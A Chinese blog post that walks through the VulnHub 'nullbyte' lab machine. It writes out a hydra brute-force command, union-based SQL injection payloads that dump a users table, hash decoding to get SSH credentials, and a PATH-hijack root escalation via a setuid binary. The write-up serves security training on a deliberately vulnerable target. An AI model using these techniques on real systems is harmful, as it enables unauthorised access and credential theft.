---
title: 跟着红队笔记打靶：nullbyte
url: https://mp.weixin.qq.com/s/278ROlvOHTMuP2c8hROdnQ
source: Doonsec's feed
date: 2026-03-25
fetch_date: 2026-03-26T04:27:12.262819
---

# 跟着红队笔记打靶：nullbyte

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hAugh98lMaTspRQHUl4mnvFP3tzvAOlzEicx2flicMKJaicpoZoCAcIwuiallcibUtRibq8jetqDxOd4R4kEhv5cHVorwwKZh95Tc8cPmU41cI3GQ/0?wx_fmt=jpeg)

# 跟着红队笔记打靶：nullbyte

原创

网安热爱者week
网安热爱者week

week的杂货铺

![]()

在小说阅读器中沉浸阅读

# 靶场地址：https://www.vulnhub.com/entry/nullbyte-1,126/

#

# 大佬的视频：【「红队笔记」靶机精讲：Nullbyte - SQL注入大赏，4种注入方式，1次呈现！】https://www.bilibili.com/video/BV16L411C7Rn?vd\_source=3caf2dac9c9273de4d9b0fead4712250

#

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaQxpoJXQ1VMKNjRgXcPBISatEWCfwg1iaCgSianKSg6JgnpX5TkamoXS7nPNHgSibuofNSKR7rZ6gMHG6icQgQfR8EBwF28qOj12MU/640?wx_fmt=png&from=appmsg)

#

# 1. 信息搜集：

## 1.1. 主机发现：

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaToZyc4HTVXSsEiaAVB3NXsdoOAJjE3MWWmic1Pnj0wksDIh8Gtdl05O7K2KBvrQYnxU3mkHiciav1dNiabMyE0o6tfahcicEd8uU7ek/640?wx_fmt=png&from=appmsg)

138是靶机

## 1.2. 端口扫描：

TCP：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaTUiaDavPmibibdibB8ia34Yhzfx96tRsT6w8TS0ebsQBhUVDqd3ctIqwySSd1RX2vzsWjBCnl7XAXYjw8v0mFGGvBL2k0CwmceGWnQ/640?wx_fmt=png&from=appmsg)

UDP：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaTRZpj6vbTU4ykZ87YKdM0AKhc0A475VDPlruu6vDjd9mkttu8ynDm9urwSPLMficH2Z0Zp4uYWDfnFzicTvtOIUmlG0tfocgibmU/640?wx_fmt=png&from=appmsg)

## 1.3. 详细扫描：

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaQJkuaic1c8jcZHIYjB3xliaRkWmCmIqrzXPLYCiayEGRuP6gY187YEIlfic5NwiaES6bibopJF3EIz3pclmVichW1YKeHcEf58oqC3fE/640?wx_fmt=png&from=appmsg)

nmap自带脚本扫描：

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaQhm4QMgV7ImHrT6aiaV4r7emGayRU6AiaLibTuJv8tJtepyc5scprYyNq4XlxGIzn6yTC28weHCcujBhUeS0k4b6jxNtISENOe20/640?wx_fmt=png&from=appmsg)

# 2. 渗透测试：

index就是一段话：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaQvx5bUdlHZK07NnML944kQEDbSrwpR0SxrYAL5ByicIDR0QogZ9Rf0tZPy1XyV62ibRWU5sKvw0ATVKt5bW36DNGLkXDhws0Dibw/640?wx_fmt=png&from=appmsg)

phpmyadmin 没账密

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaROfJdrKLZLxOSDoaRaibNpuFbiaxZChmDYic0ibs4goc0LmFh1G875OgZQViajjqtoOC7tPcjF4CAic6YdnP8sG7DsF3g9bY9A12phY/640?wx_fmt=png&from=appmsg)

/uploads:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaR8FtKggUO5FS0qxIOuZXeVXLSlKiaYEcn3ribgJvGALVHicvjCbq0bl9rVCeTicP1vOhmGmWVb2oLrUZ3NXDPZ9zsRMXb7vwGU3ZA/640?wx_fmt=png&from=appmsg)

扫目录也没有什么有用的。。

这里其实是已经懵逼了。。。

其实也没啥能干的 主页有一个main.gif下下来：

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaROIicTSGrdyVuldcPiaP7O4gRicQ2ib6ypkdibm0G1vnjGWOhMAnx616I69xsekKibU7pWz904AoA95bQ2AqorTtdD20guVwoyicdkAk/640?wx_fmt=png&from=appmsg)

确实是一个gif

一个专门的查看软件进行查看

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaTrJccKatfrptN33VraLISB7z8gBkiaN6orgiaib6AcicP2hkzD84I0r8hV4r1ao5TjvQuAQLShX0aIrM30GvsXmqbGeQ7RQFoNSibM/640?wx_fmt=png&from=appmsg)

comment有隐藏信息

作为路径访问尝试

有一个新的页面 让输入key:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaQuhsoQDTHWKPBkLRt7teCRyibZvqtqeu4QoUcOguBnZ54Nm8MWW4X6eZaSHcKb3fYTuMV5CG7pfz47ic6GWWF8PEYNQLl7Fmdqc/640?wx_fmt=png&from=appmsg)

这里就只能爆破了其实。。。

```
hydra 192.168.137.138 http-form-post "/kzMb5nVYJw/index.php:Key=^PASS^:invalid key" -l week -P /usr/share/wordlists/rockyou.txt
```

最后爆破出来的是elite

进到里面是一个查询页面

几个sql信息搜集：

```
database()user()@@version()
```

```
usrtosearch=1" order by 3 --+usrtosearch=1" union select 1,2,database()--+usrtosearch=1" union select table_name,2,3 from information_schema.tables where table_schema='seth' ;--+usrtosearch=1" union select column_name,2,3 from information_schema.columns where table_schema='seth' and table_name = 'users'--+usrtosearch=1" union select user,pass,position form users --+
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaQ0LoRV2oBPYNsA5gFWic6klbadzZVUnLNl192ljgibibk0iad7YjaPLHaBwuMGhz4yafosu3yzuzPZbo3Y0xlzicWiaEGSZOIBZrsg0/640?wx_fmt=png&from=appmsg)

最后拿到一个字符串：

```
YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE
```

看着像base64:

```
echo YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE |base64 -d
```

这里解密之后返回的是一个md5

解密之后发现是omega

可以直接使用ramses omega登入

不能运行sudo。。。

/etc/passwd

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaShRBcPFC5NJjEBmXSiazicNm7443o1qVQkpNBwGsSlmQhC41OgZngkZr6b4pVPmN6s9Krf0TtI8ckvdIgJG2YQr1rq9eEuK9ycI/640?wx_fmt=png&from=appmsg)

用户home目录没东西

计划任务没东西。。。

然后看一下网站目录：

/var/www有一个backup:
![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaQZNHyCvBZIOjjo7g2dLEEzFdICFtkm0yAdqj9fxwSLz9kqIiaasO76ZJYtSP4icwpQ5HZCkU3PdiaZr65Oo4PYRC4mFCcj3dCGSg/640?wx_fmt=png&from=appmsg)

里面是这个东西：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaS7HcQnKdibUXibHEfvSOSM9DeH2lUa4ib5XD7GVVsaF2ed7bsK9BkR7ia4PpUsb8VNb39MFqrrATF67WEr6tmWAc7YvaRC2Kt3rAc/640?wx_fmt=png&from=appmsg)

这个程序是以s运行的 那就很好了。

看输出，他这个程序有点像运行了ps

那就创建一个ps命令 让这个ps命令转向/bin/sh

然后把这个ps路径加到系统路径

这样运行这个程序的时候就会调用我们指定路径的ps 进一步调用里面的/bin/sh

因为这个程序是默认root权限运行 所以调用的/bin/sh也会是root

```
ln -s /bin/sh psexport PATH=.:$PATH
```

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaQ20Of9hZiaibIWialj9ADAyrHAmgAQWWejofrW5SYCY7nddeDPKSIF7DasSicM00YArFffKmTib2Aebv6NTzV9mIhq6bmKkgTJ6MrQ/640?wx_fmt=png&from=appmsg)

已经root了~~

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNnTxGCg6aIVbhM9D1S6MS9icUgXsY3jibbmDFsvMj1Y7QjcgdNcGRquVNaNicCiclHLh9ssHNicl2cJfA/0?wx_fmt=png)

week的杂货铺

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNnTxGCg6aIVbhM9D1S6MS9icUgXsY3jibbmDFsvMj1Y7QjcgdNcGRquVNaNicCiclHLh9ssHNicl2cJfA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过